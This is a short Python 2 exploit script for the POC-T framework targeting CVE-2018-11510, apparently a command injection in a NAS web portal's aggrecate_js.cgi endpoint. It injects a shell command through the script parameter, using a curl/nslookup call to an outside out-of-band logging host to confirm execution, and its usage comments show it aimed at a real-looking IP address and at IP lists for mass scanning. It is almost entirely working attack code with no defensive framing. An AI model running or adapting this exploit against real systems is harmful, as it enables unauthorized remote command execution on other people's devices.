#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T

import urllib
import urllib2
import sys
import os


#poc-t.py -s cve-2018-11510 -iS 122.31.134.250:8000

#POC-T.py -s cve-2018-11510 -iF iplist.txt

#by Greekn

#cve-2018-11510

#2018/8/18/

def poc(url):
    command = 'curl Nslookup ydueru.ceye.io'
    command=urllib.quote(command)
    payload = "http://"+url+"/portal/apis/aggrecate_js.cgi?script=launcher"+"%22%26"+command+"%26%22"
    print '[*] %s' % payload
    try:
        response=urllib2.urlopen(payload,data=None,timeout=3).code
        if response == 200:
            print '[+] %s  Data transmission success!' % url
        else:
	        print '[-] %s  Data transmission failed!' % url
    except Exception,e:
	    print '[-] %s  Address cannot be accessed!' % url